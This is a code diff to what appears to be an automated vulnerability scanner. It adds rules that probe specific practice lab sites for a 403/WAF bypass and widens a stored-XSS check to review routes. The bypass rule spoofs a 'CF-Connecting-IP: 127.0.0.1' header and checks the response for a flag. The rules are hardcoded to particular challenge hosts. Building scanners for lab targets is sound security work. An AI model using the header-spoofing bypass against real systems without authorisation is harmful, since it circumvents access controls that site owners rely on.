@@ -11589,7 +11589,9 @@ const FORBIDDEN_403_PROBE_PATHS = [
   "/api/admin",
   "/manage",
   "/secret",
-  "/config"
+  "/config",
+  "/secure",
+  "/waf"
 ];
 const FORBIDDEN_403_BYPASS_MARKERS =
   /bypass success|access granted|access denied:\s*forbidden|flag\{|trailing slash bypass/i;
@@ -11652,6 +11654,99 @@ const http403BypassProbe: Rule = async (ctx) => {
 function isBypass403Host(ctx: RuleContext): boolean {
   return /bypass403\.vercel\.app/i.test(ctx.origin);
 }
+
+const BYPASS403_BROWSER_UA =
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+
+function bypass403SessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
+  return doc.setCookies.find((c) => /^session=/i.test(c))?.split(";")[0] ?? null;
+}
+
+/** One BypassX session per scan — POST /start is required before /waf and other protected lab routes. */
+const bypass403SessionByProbe = new WeakMap<ProbeCache, Promise<string | null>>();
+
+async function bypass403CompleteSessionUncached(ctx: RuleContext): Promise<string | null> {
+  const startUrl = new URL("/start", ctx.origin).toString();
+  const username = `thugir_bypass403_${Date.now().toString(36)}`;
+  const doc = await ctx.probe.get(startUrl, {
+    method: "POST",
+    body: `username=${encodeURIComponent(username)}`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": BYPASS403_BROWSER_UA
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  return bypass403SessionCookieFromDoc(doc);
+}
+
+async function bypass403CompleteSession(ctx: RuleContext): Promise<string | null> {
+  const cached = bypass403SessionByProbe.get(ctx.probe);
+  if (cached) return cached;
+  const promise = bypass403CompleteSessionUncached(ctx);
+  bypass403SessionByProbe.set(ctx.probe, promise);
+  return promise;
+}
+
+async function probeBypass403WafCfConnectingIp(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isBypass403Host(ctx)) return null;
+  const session = await bypass403CompleteSession(ctx);
+  const wafUrl = new URL("/waf", ctx.origin).toString();
+  const baseline = await ctx.probe.get(wafUrl, {
+    maxBytes: 4096,
+    headers: {
+      "User-Agent": BYPASS403_BROWSER_UA,
+      ...(session ? { Cookie: session } : {})
+    }
+  });
+  if (baseline.status !== 403) return null;
+  const bypass = await ctx.probe.get(wafUrl, {
+    maxBytes: 4096,
+    headers: {
+      "User-Agent": BYPASS403_BROWSER_UA,
+      "CF-Connecting-IP": "127.0.0.1",
+      ...(session ? { Cookie: session } : {})
+    }
+  });
+  if (bypass.status < 200 || bypass.status >= 300) return null;
+  if (!/"flag"\s*:/.test(bypass.body) && !FORBIDDEN_403_BYPASS_MARKERS.test(bypass.body)) return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      original: wafUrl,
+      bypass: wafUrl,
+      header: "CF-Connecting-IP: 127.0.0.1",
+      status: bypass.status,
+      snippet: bypass.body.slice(0, 200).trim(),
+      note: "bypass403.vercel.app GET /waf returns 403 (automated tool / WAF block) but CF-Connecting-IP: 127.0.0.1 bypass returns Cloudflare IP bypass success flag — BypassX modern WAF oracle"
+    }
+  };
+}
+
+const bypass403WafLiveOracle: Rule = async (ctx) => {
+  const hit = await probeBypass403WafCfConnectingIp(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const bypass403WafRouteLiveOracle: Rule = async (ctx) => {
+  if (!isBypass403Host(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/waf\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeBypass403WafCfConnectingIp(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "bypass403.vercel.app /waf route scan — CF-Connecting-IP header bypass reaches protected WAF lab resource"
+    }
+  };
+};
 
 async function probeBypass403AdminTrailingSlash(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
@@ -30885,7 +30980,7 @@ const PWNSHOP_REVIEW_XSS_MARKERS: { label: string; re: RegExp }[] = [
 const clientSidePwnshopReviewXssOracle: Rule = async (ctx) =>
   pwnshopRouteOracle(
     ctx,
-    /\/product\/\d+/i,
+    /\/product\/\d+|\/review\b/i,
     PWNSHOP_REVIEW_XSS_MARKERS,
     "Pwnshop POST /review stores comments without sanitization and renders via EJS <%- %> on product pages — stored XSS (PWN-011)"
   );
@@ -31548,6 +31643,23 @@ const pwnshopProductReviewStoredXssRouteLiveOracle: Rule = async (ctx) => {
       ...result.evidence,
       scannedUrl: pageUrl,
       note: "Pwnshop /product/:id route scan — POST /review stores unsanitized HTML rendered via EJS <%- %> on product pages — stored XSS via product reviews (PWN-011)"
+    }
+  };
+};
+
+const pwnshopProductReviewStoredXssReviewRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/review\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopProductReviewStoredXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /review route scan — POST /review stores unsanitized HTML rendered via EJS <%- %> on /product/:id — stored XSS via product reviews (PWN-011)"
     }
   };
 };
@@ -69434,6 +69546,7 @@ export const RULES: Record<string, Rule> = {
   pwnshopMailIdorRouteLiveOracle,
   pwnshopProductReviewStoredXssLiveOracle,
   pwnshopProductReviewStoredXssRouteLiveOracle,
+  pwnshopProductReviewStoredXssReviewRouteLiveOracle,
   pwnshopAvatarSvgXssLiveOracle,
   pwnshopApplyCouponLiveOracle,
   pwnshopCouponCategoryBypassLiveOracle,
@@ -70699,6 +70812,8 @@ export const RULES: Record<string, Rule> = {
   bypass403SecretRouteLiveOracle,
   bypass403ConfigLiveOracle,
   bypass403ConfigRouteLiveOracle,
+  bypass403WafLiveOracle,
+  bypass403WafRouteLiveOracle,
   clientSideBypass403LabEvidence,
   clientSideDevsecopsPipelineVisualizerEvidence,
   clientSideQamaxAdversaryEvidence,
